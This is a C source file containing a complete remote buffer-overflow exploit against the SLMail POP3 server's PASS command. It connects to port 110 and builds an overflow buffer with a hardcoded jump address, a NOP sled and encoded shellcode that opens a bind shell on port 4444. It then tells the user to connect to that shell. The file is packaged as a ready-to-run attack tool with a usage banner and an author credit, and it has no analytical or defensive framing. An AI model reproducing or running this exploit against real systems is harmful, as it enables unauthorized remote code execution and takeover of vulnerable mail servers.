/*
SLMAIL REMOTE PASSWD BOF - Ivan Ivanovic Ivanov ????-?????
???????????????? 31337 Team
*/

#include <string.h>
#include <stdio.h>
#include <winsock2.h>
#include <windows.h>

// [*] bind 4444 
unsigned char shellcode[] = "\xbd\x6e\xd2\xf3\xb0\xda\xd3\xd9\x74\x24\xf4\x5b\x29\xc9\xb1"
"\x52\x83\xeb\xfc\x31\x6b\x0e\x03\x05\xdc\x11\x45\x25\x08\x57"
"\xa6\xd5\xc9\x38\x2e\x30\xf8\x78\x54\x31\xab\x48\x1e\x17\x40"
"\x22\x72\x83\xd3\x46\x5b\xa4\x54\xec\xbd\x8b\x65\x5d\xfd\x8a"
"\xe5\x9c\xd2\x6c\xd7\x6e\x27\x6d\x10\x92\xca\x3f\xc9\xd8\x79"
"\xaf\x7e\x94\x41\x44\xcc\x38\xc2\xb9\x85\x3b\xe3\x6c\x9d\x65"
"\x23\x8f\x72\x1e\x6a\x97\x97\x1b\x24\x2c\x63\xd7\xb7\xe4\xbd"
"\x18\x1b\xc9\x71\xeb\x65\x0e\xb5\x14\x10\x66\xc5\xa9\x23\xbd"
"\xb7\x75\xa1\x25\x1f\xfd\x11\x81\xa1\xd2\xc4\x42\xad\x9f\x83"
"\x0c\xb2\x1e\x47\x27\xce\xab\x66\xe7\x46\xef\x4c\x23\x02\xab"
"\xed\x72\xee\x1a\x11\x64\x51\xc2\xb7\xef\x7c\x17\xca\xb2\xe8"
"\xd4\xe7\x4c\xe9\x72\x7f\x3f\xdb\xdd\x2b\xd7\x57\x95\xf5\x20"
"\x97\x8c\x42\xbe\x66\x2f\xb3\x97\xac\x7b\xe3\x8f\x05\x04\x68"
"\x4f\xa9\xd1\x3f\x1f\x05\x8a\xff\xcf\xe5\x7a\x68\x05\xea\xa5"
"\x88\x26\x20\xce\x23\xdd\xa3\xfb\xb8\xdd\xb9\x94\xbc\xdd\xbc"
"\xdf\x48\x3b\xd4\x0f\x1d\x94\x41\xa9\x04\x6e\xf3\x36\x93\x0b"
"\x33\xbc\x10\xec\xfa\x35\x5c\xfe\x6b\xb6\x2b\x5c\x3d\xc9\x81"
"\xc8\xa1\x58\x4e\x08\xaf\x40\xd9\x5f\xf8\xb7\x10\x35\x14\xe1"
"\x8a\x2b\xe5\x77\xf4\xef\x32\x44\xfb\xee\xb7\xf0\xdf\xe0\x01"
"\xf8\x5b\x54\xde\xaf\x35\x02\x98\x19\xf4\xfc\x72\xf5\x5e\x68"
"\x02\x35\x61\xee\x0b\x10\x17\x0e\xbd\xcd\x6e\x31\x72\x9a\x66"
"\x4a\x6e\x3a\x88\x81\x2a\x4a\xc3\x8b\x1b\xc3\x8a\x5e\x1e\x8e"
"\x2c\xb5\x5d\xb7\xae\x3f\x1e\x4c\xae\x4a\x1b\x08\x68\xa7\x51"
"\x01\x1d\xc7\xc6\x22\x34";

void exploit(int sock) {
      FILE *test;

      char userbuf[] = "USER madivan\r\n";
      char receive[1024];

      // banner
      recv(sock, receive, 200, 0);
      printf("[+] %s", receive);

      // user
      printf("[+] Sending Username...\n");
      send(sock, userbuf, strlen(userbuf), 0);
      recv(sock, receive, 200, 0);
      //printf("[+] %s", receive);

      char* ptr;
      char buf[3500];
      char evil[3500];
      memset(evil, 0x41, 3500);
      char jmp[] = "\x8f\x35\x4a\x5f";
      memcpy(evil + 2606, jmp, 4);
      char nopsled[] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";
      memcpy(evil + 2606+4, nopsled, 16);
      memcpy(evil + 2606+4+16, shellcode, 351);
      
      // passwd
      printf("[+] Sending Evil buffer...\n");
      sprintf(buf, "PASS %s \r\n", evil);
      send(sock, buf, strlen(buf), 0);
      printf("[*] Done! Connect to the host on port 4444...\n\n");
}

int connect_target(char *host, u_short port)
{
    int sock = 0;
    struct hostent *hp;
    WSADATA wsa;
    struct sockaddr_in sa;

    WSAStartup(MAKEWORD(2,0), &wsa);
    memset(&sa, 0, sizeof(sa));

    hp = gethostbyname(host);
    if (hp == NULL) {
        printf("gethostbyname() error!\n"); exit(0);
    }
    printf("[+] Connecting to %s\n", host);
    sa.sin_family = AF_INET;
    sa.sin_port = htons(port);
    sa.sin_addr = **((struct in_addr **) hp->h_addr_list);

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0)      {
        printf("[-] socket blah?\n");
        exit(0);
        }
    if (connect(sock, (struct sockaddr *) &sa, sizeof(sa)) < 0)
        {printf("[-] connect() blah!\n");
        exit(0);
          }
    printf("[+] Connected to %s\n", host);
    return sock;
}


int main(int argc, char **argv)
{
    int sock = 0;
    int data, port;
    printf("\n[$] SLMail Server POP3 PASSWD Buffer Overflow exploit\n");
    printf("[$] by Mad Ivan [ void31337 team ] - http://exploit.void31337.ru\n\n");
    if ( argc < 2 ) { printf("usage: slmail-ex.exe <host> \n\n"); exit(0); }
    port = 110;
    sock = connect_target(argv[1], port);
    exploit(sock);
    closesocket(sock);
    return 0;
}